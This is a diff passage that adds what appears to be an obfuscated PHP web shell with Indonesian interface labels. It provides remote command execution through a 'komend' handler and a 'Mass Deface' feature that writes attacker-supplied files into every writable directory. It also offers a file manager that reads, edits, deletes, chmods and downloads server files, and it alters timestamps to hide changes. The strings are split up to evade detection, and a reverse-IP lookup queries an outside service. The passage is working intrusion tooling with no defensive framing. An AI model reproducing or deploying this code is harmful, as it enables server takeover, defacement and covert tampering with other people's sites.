+		echo '<input type="submit" name="palepale" value="Gaskan" class="up" style="cursor: pointer"></form>';
+	}
+	die();
+} elseif (isset($_GET['opsi']) && $_GET['opsi'] == "repip") {
+	echo "<center>";
+	echo "Re"."ver"."se I"."P : <gold>".$hsc($_SERVER['SE'.'RVE'.'R_NA'.'ME'])."</gold>";
+	echo "<pre>".$hsc(crul("http"."s://ap"."i.ha"."ck"."ertarg"."et.com/re"."verse"."ipl"."ookup/?q=".$_SERVER['SE'.'RVE'.'R_NA'.'ME']))."</pre>";
+	echo "</center>";
+	die();
+} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "mdf") {
+	echo "<center>";
+	if (empty($_POST['palepale'])) {
+		echo '<form method="post">';
+		echo 'Di'.'r : <input type="text" name="lokena" class="up" style="cursor: pointer; border-color: #000" value="'.$hsc($_GET['loknya']).'"><br>';
+		echo 'Nama Fi'.'le : <input type="text" name="nfil" class="up" style="cursor: pointer; border-color: #000" value="ind'.'ex.p'.'hp"><br><br>';
+		echo 'Isi Fi'.'le : <br><textarea class="up" cols="80" rows="20" name="isikod"></textarea><br><br>';
+		echo '<select name="opsina"><option value="mdf">Ma'.'ss Def'.'ace</option><option value="mds">Ma'.'ss De'.'fa'.'ce 2</option></select><br><br>';
+		echo '<input type="submit" name="palepale" value="Gaskeun" class="up" style="cursor: pointer">';
+		echo '</form>';
+	} else {
+		$lokena = $_POST['lokena'];
+		$nfil = $_POST['nfil'];
+		$isif = $_POST['isikod'];
+		echo "Di"."r : <gold>".$hsc($lokena)."</gold><br>";
+		if (!$fxt($lokena)) {
+			die(red("[+] Di"."re"."cto"."ry Tidak di Temukan !"));
+		}
+		$g = $scd($lokena);
+		if (isset($_POST['opsina']) && $_POST['opsina'] == "mds") {
+			foreach ($g as $gg) {
+				if (isset($gg) && $gg == "." || $gg == "..") {
+					continue;
+				} elseif (!$idr($gg)) {
+					continue;
+				}
+				if (!$isw($lokena."/".$gg)) {
+					echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>";
+					continue;
+				}
+				$loe = $lokena."/".$gg."/".$nfil;
+				$cf = $fgr($gg);
+				if ($cf == "9"."9") {
+					if ($fpt($loe, $isif) !== false) {
+						if ($sps($gg, ".") !== false) {
+							echo "[<ijo>Su"."cc"."ess</ijo>] ".$loe." -> <a href='//".$gg."/".$nfil."'><gold>".$gg."/".$nfil."</gold></a><br>";
+						} else {
+							echo "[<ijo>Su"."cc"."ess</ijo>] ".$loe."<br>";
+						}
+					}
+				}
+			}
+			echo "<hr>";
+			die(author());
+		}
+		foreach ($g as $gg) {
+			if (isset($gg) && $gg == "." || $gg == "..") {
+				continue;
+			} elseif (!$idr($gg)) {
+				continue;
+			}
+			if (!$isw($lokena."/".$gg)) {
+				echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>";
+				continue;
+			}
+			$loe = $lokena."/".$gg."/".$nfil;
+			if ($fpt($loe, $isif) !== false) {
+				echo "[<ijo>Su"."cc"."ess</ijo>] ".$loe."<br>";
+			} else {
+				echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>";
+			}
+		}
+	}
+	echo "<hr>";
+	echo "</center>";
+	die(author());
+}
+
+if (isset($_GET['lokasie'])) {
+	echo "<tr><td>Current Fi"."le : ".$_GET['lokasie'];
+	echo '</tr></td></table><br/>';
+	echo "<pre>".$hsc($fgt($_GET['lokasie']))."</pre>";
+	author();
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "hapus") {
+	if ($idi($_POST['loknya']) && $fxt($_POST['loknya'])) {
+		xrd($_POST['loknya']);
+		if ($fxt($_POST['loknya'])) {
+			red("Fai"."led to del"."ete D"."ir"."ec"."tory !");
+		} else {
+			green("Del"."ete Di"."r"."ect"."ory Suc"."cess !");
+		}
+	} elseif ($ifi($_POST['loknya']) && $fxt($_POST['loknya'])) {
+		@$ulk($_POST['loknya']);
+		if ($fxt($_POST['loknya'])) {
+			red("Fa"."il"."ed to Delete Fi"."le !");
+		} else {
+			green("De"."le"."te Fi"."le Succ"."ess !");
+		}
+	} else {
+		red("Fi"."le / Di"."r"."ecto"."ry not Fo"."und !");
+	}
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
+	if (!isset($_POST['cemod'])) {
+		if ($_POST['ty'.'pe'] == "fi"."le") {
+			echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
+		} else {
+			echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
+		}
+		echo '<form method="post">
+		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
+		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+		<input type="hidden" name="pilih" value="ubahmod">';
+		if ($_POST['ty'.'pe'] == "fi"."le") {
+			echo '<input type="hidden" name="type" value="fi'.'le">';;
+		} else {
+			echo '<input type="hidden" name="type" value="di'.'r">';;
+		}
+		echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
+		</form><br>';
+	} else {
+		$cm = @$chm($_POST['loknya'], $ocd($_POST['perm']));
+		if ($cm == true) {
+			green("Change Mod Su"."cc"."ess !");
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
+			} else {
+				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
+			}
+			echo '<form method="post">
+			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
+			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+			<input type="hidden" name="pilih" value="ubahmod">';
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo '<input type="hidden" name="type" value="fi'.'le">';;
+			} else {
+				echo '<input type="hidden" name="type" value="di'.'r">';;
+			}
+			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
+			</form><br>';
+		} else {
+			red("Change Mod Fa"."il"."ed !");
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
+			} else {
+				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
+			}
+			echo '<form method="post">
+			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
+			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+			<input type="hidden" name="pilih" value="ubahmod">';
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo '<input type="hidden" name="type" value="fi'.'le">';;
+			} else {
+				echo '<input type="hidden" name="type" value="di'.'r">';;
+			}
+			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
+			</form><br>';
+		}
+	}
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahnama") {
+	if (isset($_POST['gantin'])) {
+		$namabaru = $_GET['loknya']."/".$_POST['newname'];
+		$ceen = "re"."na"."me";
+		if (@$ceen($_POST['loknya'], $namabaru) === true) {
+			green("Change Name Su"."cc"."ess");
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
+			} else {
+				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
+			}
+			echo '<form method="post">
+			New Name : <input name="newname" type="text" class="up" size="20" value="'.$hsc($_POST['newname']).'" />
+			<input type="hidden" name="loknya" value="'.$_POST['newname'].'">
+			<input type="hidden" name="pilih" value="ubahnama">';
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo '<input type="hidden" name="type" value="fi'.'le">';;
+			} else {
+				echo '<input type="hidden" name="type" value="di'.'r">';;
+			}
+			echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
+			</form><br>';
+		} else {
+			red("Change Name Fa"."il"."ed");
+		}
+	} else {
+		if ($_POST['ty'.'pe'] == "fi"."le") {
+			echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
+		} else {
+			echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
+		}
+		echo '<form method="post">
+		New Name : <input name="newname" type="text" class="up" size="20" value="'.$hsc($bsn($_POST['loknya'])).'" />
+		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+		<input type="hidden" name="pilih" value="ubahnama">';
+		if ($_POST['ty'.'pe'] == "fi"."le") {
+			echo '<input type="hidden" name="type" value="fi'.'le">';;
+		} else {
+			echo '<input type="hidden" name="type" value="di'.'r">';;
+		}
+		echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
+		</form><br>';
+	}
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
+	if (isset($_POST['gasedit'])) {
+		$edit = @$fpt($_POST['loknya'], $_POST['src']);
+		if ($fgt($_POST['loknya']) == $_POST['src']) {
+			green("Ed"."it Fi"."le Suc"."ce"."ss !");
+		} else {
+			red("Ed"."it Fi"."le Fai"."led !");
+		}
+	}
+	echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br><br>";
+	echo '<form method="post">
+	<textarea cols=80 rows=20 name="src">'.$hsc($fgt($_POST['loknya'])).'</textarea><br>
+	<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+	<input type="hidden" name="pilih" value="ed'.'it">
+	<input type="submit" value="Ed'.'it Fi'.'le" name="gasedit" class="up" style="cursor: pointer; border-color: #fff"/>
+	</form><br>';
+} elseif (isset($_POST['komends'])) {
+	if (isset($_POST['komend'])) {
+		if (isset($_GET['loknya'])) {
+			$lk = $_GET['loknya'];
+		} else {
+			$lk = $gcw();
+		}
+		$km = 'ko'.'me'.'nd';
+		echo $km($_POST['komend'], $lk);
+		exit();
+	}
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahtanggal") {
+	if (isset($_POST['tanggale'])) {
+		$stt = "st"."rtot"."ime";
+		$tch = "t"."ou"."ch";
+		$tanggale = $stt($_POST['tanggal']);
+		if (@$tch($_POST['loknya'], $tanggale) === true) {
+			green("Change Da"."te Succ"."ess !");
+			$det = "da"."te";
+			$ftm = "fi"."le"."mti"."me";
+			$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
+			} else {
+				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
+			}
+			echo '<form method="post">
+			New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
+			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+			<input type="hidden" name="pilih" value="ubahtanggal">';
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo '<input type="hidden" name="type" value="fi'.'le">';;
+			} else {
+				echo '<input type="hidden" name="type" value="di'.'r">';;
+			}
+			echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
+			</form><br>';
+		} else {
+			red("Fai"."led to Cha"."nge Da"."te !");
+		}
+	} else {
+		$det = "da"."te";
+		$ftm = "fi"."le"."mti"."me";
+		$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
+		if ($_POST['ty'.'pe'] == "fi"."le") {
+			echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
+		} else {
+			echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
+		}
+		echo '<form method="post">
+		New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
+		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+		<input type="hidden" name="pilih" value="ubahtanggal">';
+		if ($_POST['ty'.'pe'] == "fi"."le") {
+			echo '<input type="hidden" name="type" value="fi'.'le">';;
+		} else {
+			echo '<input type="hidden" name="type" value="di'.'r">';;
+		}
+		echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
+		</form><br>';
+	}
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "dunlut") {
+	$dunlute = $_POST['loknya'];
+	if ($fxt($dunlute) && isset($dunlute)) {
+		if ($ird($dunlute)) {
+			dunlut($dunlute);
+		} elseif ($idr($fl)) {
+			red("That is Di"."rec"."tory, Not Fi"."le -_-");
+		} else {
+			red("Fi"."le is Not Re"."adab"."le !");
+		}
+	} else {
+		red("Fi"."le Not Fo"."und !");
+	}
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "fo"."ld"."er") {
+    if ($isw("./") || $ird("./")) {
+        $loke = $_POST['loknya'];
+        if (isset($_POST['buatfol'.'der'])) {
+            $buatf = $mkd($loke."/".$_POST['fo'.'lde'.'rba'.'ru']);
+            if ($buatf == true) {
+                green("Fol"."der <b>".$hsc($_POST['fo'.'lde'.'rba'.'ru'])."</b> Created !");
+                echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+                <input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
+            } else {
+                red("Fa"."il"."ed to Create fol"."der !");
+                echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+                <input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
+            }
+        } else {
+            echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+            echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
+        }
+    }
+} elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fi"."le") {
+    if ($isw("./") || $isr("./")) {
+        $loke = $_POST['lok'.'nya'];
+        if (isset($_POST['buatfi'.'le'])) {
+            $buatf = $fpt($loke."/".$_POST['fi'.'lebaru'], "");
+            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
+                green("File <b>".$hsc($_POST['fi'.'lebaru'])."</b> Created !");
+                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create Fi'.'le" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
+                <input type="hidden" name="pilih" value="fi'.'le"></form>';
+            } else {
+                red("Fa"."il"."ed to Create Fi"."le !");
+                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
+                <input type="hidden" name="pilih" value="fi'.'le"></form>';
+            }
+        } else {
+            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+            echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
+        }
+    }
+}
+
+echo '<div class="table-responsive mt-4">
+<table class="table table-hover table-bordered">
+<thead>
+<tr>
+<th>Na'.'me</th>
+<th class="text-center">Si'.'ze</th>
+<th class="text-center">Las'.'t Mo'.'dif'.'ied</th>
+<th class="text-center">Owner / Group</th>
+<th class="text-center">Pe'.'rmi'.'ss'.'ions</th>
+<th class="text-center">Op'.'tio'.'ns</th>
+</tr>
+</thead>
+<tbody>';
+
+echo "<tr>";
+$euybrekw = $srl($bsn($lokasi), "", $lokasi);
+$euybrekw = $srl("//", "/", $euybrekw);
+echo "<td><i class='fas fa-folder' style='color: #808080'></i> <a href=\"?loknya=".$euybrekw."\">..</a></td>
+<td class='text-center'>--</td>
+<td class='text-center'>".fdt($euybrekw)."</td>
+<td class='text-center'>".gor($euybrekw)." / ".ggr($euybrekw)."</td>
+<td class='text-center'>";
+if($isw($euybrekw)) echo '<span class="text-success">';
+elseif(!$isr($euybrekw)) echo '<span class="text-danger">';
+echo statusnya($euybrekw);
+if($isw($euybrekw) || !$isr($euybrekw)) echo '</span>';
+echo "</td>
+<td class='text-center'><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\" class=\"d-inline\">
+<input type=\"hidden\" name=\"type\" value=\"d"."ir\">
+<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/\">
+<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='fol"."der' title='Create Folder'><i class='fas fa-folder'></i></button>
+<button type='submit' class='btn btn-sm btn-action' name='pilih' value='file' title='Create File'><i class='fas fa-file'></i></button>
+</form>";
+echo "</tr>";
+
+foreach($lokasinya as $ppkcina){
+	$euybre = $lokasi."/".$ppkcina;
+	$euybre = $srl("//", "/", $euybre);
+	if(!$idi($euybre) || $ppkcina == '.' || $ppkcina == '..') continue;
+	echo "<tr>";
+	echo "<td><i class='fas fa-folder' style='color: #808080'></i> <a href=\"?loknya=".$euybre."\">".$ppkcina."</a></td>
+	<td class='text-center'>--</td>
+	<td class='text-center'>".fdt($euybre)."</td>
+	<td class='text-center'>".gor($euybre)." / ".ggr($euybre)."</td>
+	<td class='text-center'>";
+	if($isw($euybre)) echo '<span class="text-success">';
+	elseif(!$isr($euybre)) echo '<span class="text-danger">';
+	echo statusnya($euybre);
+	if($isw($euybre) || !$isr($euybre)) echo '</span>';
+
+	echo "</td>
+	<td class='text-center'><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\" class=\"d-inline\">
+	<input type=\"hidden\" name=\"type\" value=\"di"."r\">
+	<input type=\"hidden\" name=\"name\" value=\"$ppkcina\">
+	<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$ppkcina\">
+	<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahnama' title='Rename'><i class='fas fa-edit'></i></button>
+	<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahtanggal' title='Change Date'><i class='fas fa-calendar'></i></button>
+	<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahmod' title='Change Permission'><i class='fas fa-cog'></i></button>
+	<button type='submit' class='btn btn-sm btn-action' name='pilih' value='hapus' title='Delete'><i class='fas fa-trash'></i></button>
+	</form></td>
+	</tr>";
+}
+$skd = "10"."24";
+foreach($lokasinya as $mekicina) {
+	$euybray = $lokasi."/".$mekicina;
+	if(!$ifi("$lokasi/$mekicina")) continue;
+	$size = $fsz("$lokasi/$mekicina")/$skd;
+	$size = $rd($size,3);
+	if($size >= $skd){
+	$size = $rd($size/$skd,2).' M'.'B';
+} else {
+	$size = $size.' K'.'B';
+}
+
+echo "<tr>
+<td>".cfn($euybray)." <a href=\"?lokasie=$lokasi/$mekicina&loknya=$lokasi\">$mekicina</a></td>
+<td class='text-center'>".$size."</td>
+<td class='text-center'>".fdt($euybray)."</td>
+<td class='text-center'>".gor($euybray)." / ".ggr($euybray)."</td>
+<td class='text-center'>";
+if($isw("$lokasi/$mekicina")) echo '<span class="text-success">';
+elseif(!$isr("$lokasi/$mekicina")) echo '<span class="text-danger">';
+echo statusnya("$lokasi/$mekicina");
+if($isw("$lokasi/$mekicina") || !$isr("$lokasi/$mekicina")) echo '</span>';
+echo "</td><td class='text-center'>
+<form method=\"post\" action=\"?pilihan&loknya=$lokasi\" class=\"d-inline\">
+<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='edit' title='Edit'><i class='fas fa-edit'></i></button>
+<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahnama' title='Rename'><i class='fas fa-signature'></i></button>
+<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahtanggal' title='Change Date'><i class='fas fa-calendar'></i></button>
+<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahmod' title='Change Permission'><i class='fas fa-cog'></i></button>
+<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='dunlut' title='Download'><i class='fas fa-down"."load'></i></button>
+<button type='submit' class='btn btn-sm btn-action' name='pilih' value='hapus' title='Delete'><i class='fas fa-trash'></i></button>
+<input type=\"hidden\" name=\"type\" value=\"fi"."le\">
+<input type=\"hidden\" name=\"name\" value=\"$mekicina\">
+<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$mekicina\">
+</form></td>
+</tr>";
+}
+echo '</tbody></table></div>';
+echo '<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>';
+echo '</div></body></html>';
+author();
+
+function statusnya($fl){
+	$a = "sub"."st"."r";
+	$b = "s"."pri"."ntf";
+	$c = "fil"."eper"."ms";
+$izin = $a($b('%o', $c($fl)), -4);
+return $izin;
+}
+?>
